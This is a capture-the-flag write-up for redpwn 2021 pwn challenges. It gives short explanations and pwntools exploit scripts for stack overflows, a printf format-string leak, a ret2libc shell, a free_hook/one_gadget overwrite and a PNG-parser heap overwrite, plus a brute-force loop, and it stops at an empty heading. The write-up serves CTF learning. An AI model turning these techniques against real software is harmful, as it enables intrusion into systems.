# redpwn2021-pwn

[toc]

## beginner-generic-pwn-number-0(done)

simple stack overflow 

```python
cn.sendlineafter("message to cheer me up? :(", flat('a' *0x28, -1))
```

## ret2generic-flag-reader(done)

simple stack overflow return to .text

```python 
payload = flat('a' * 0x20, 1, 0x00000000004011F6)
cn.sendline(payload)
```

## printf-please(done)

printf format string vulnerability.

%p leak flag on the stack, and turn them into string.

```python
payload = flat("pleaseaa%70$p%71$p%72$p%73$p%74$p0x")
cn.sendline(payload)
a = cn.recvuntil('0x')[:-2]
a0 = codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[1:-2], 'hex')[::-1]
print(a0)
```

## ret2the-unknown(done)

stack overflow.

return to the system function in libc.

```python 
libc = ELF("./libc-2.28.so")

main = 0x000000000401186

cn.sendlineafter("get there safely?", flat('a' * 0x20, 0, main))
cn.recvuntil("to get there: ")
printf = int(cn.recv(12), 16)
blibc  = printf - libc.sym['printf']
print("blibc: " + hex(blibc))
system = blibc + libc.sym['system']
binsh  = blibc + next(libc.search(b"/bin/sh\x00"))
poprdi = 0x0000000004012A3
ret    = 0x0000000004012A4

cn.sendline(flat('a'*0x20, 0, ret, poprdi, binsh, system))

```

## simultaneity(done)

the libc address is obtained by fixing te heap block from mmap and the libc offset, and writing to any address by offset.

when scanf accepts a large amount of data, the running order is: malloc, write to the target address, free.

so modify `free_hook` to `one_gadget`, and prefix it with a lot of zeros, so that it will be called to `onegadget` when it is free.

```python
cn.sendlineafter("how big?", str(0x300000))
cn.recvuntil("you are here: 0x")

heap = int(cn.recv(12), 16) - 0x10
print("heap: " + hex(heap))

blibc = heap+ 0x301000
print("blibc: " + hex(blibc))

libc = ELF("./libc.so.6")
len = libc.sym['__free_hook'] + 0x301000 - 0x10
print("len: " + hex(len))

cn.sendlineafter("how far?", str(len // 8))
cn.sendlineafter("what?", '0' * 0x800 + str(blibc + 0xe5456))

```

## image-identifier(done)

The program itself is a bit difficult to reverse, mainly for parsing files,
When parsing the file content, you can construct special file content that causes overflow when writing to the file, .text:0000000000004015F9, and modify the pointer stored in the heap block behind,
When you call `pngFooterValidate` later, you can change it to the `win` function.

```python

leng = 0x29
cn.sendlineafter("How large is your file?\n\n", str(leng))
pngheader = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
data = list(flat(bytes(pngheader), 'a').ljust(leng, b'\x00'))

data[11] = 0xd

data[29] = 0xc9
data[30] = 0xef 
data[31] = 0xf1
data[32] = 0xbd

data[0x24] = 0x30 - 1 - 8

# wow, this causes `updata_crc` to return 0x1818(win+4)
data[0x25] = 0x18
data[0x26] = 0x0b

# data[0x28] = 0x1

cn.sendafter("please send your image here:\n\n", bytes(data))
cn.sendlineafter("do you want to invert the colors?\n", "y")

```

About this magic data, `data[0x25] = 0x18, data[0x26] = 0x0b`, 

Blast it with the following script

```python

leng = 0x29
pngheader = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
data = list(flat(bytes(pngheader), 'a').ljust(leng, b'\x00'))

data[11] = 0xd

data[29] = 0xc9
data[30] = 0xef 
data[31] = 0xf1
data[32] = 0xbd

data[0x24] = 0x30 - 1 - 8


for i in range(0, 0xff):
    for j in range(0, 0xff):
        cn = process("./chal")
        cn.sendlineafter("How large is your file?\n\n", str(leng))
        # wow, this causes `updata_crc` to return 0x1818
        data[0x25] = i
        data[0x26] = j

        # data[0x28] = 0x1
        cn.sendafter("please send your image here:\n\n", bytes(data))
        cn.sendlineafter("do you want to invert the colors?\n", "y")

        time.sleep(0.5)

        print("i: " + hex(i) + "\nj: " + hex(j))

        if cn.poll() == None :
            print("!!!")
            break;

        cn.close()
```

The following data can be obtained: 

`i=0x04, j=0x40`: 0x4018e4 (main+185)

`i=0x07, j=0x7d`: 0x401179 (_start+9)

`i=0x0b, j=0xf3`: 0x4018ee (main+195) 

`i=0x11, j=0x15`: 0x4018c7 (main+156)

`i=0x15, j=0x37`: 0x40182b (main)

`i=0x18, j=0x0b`: 0x401818 (win+4) !!!!!!!!!!!

`i=0x1f, j=0x14`: 0x401169 (exit@plt+9)

`i=0x21, j=0xc7`: 0x4018e7 (main+188)

`i=0x22, j=0xfa`: 0x40117a (_start+10)

## empires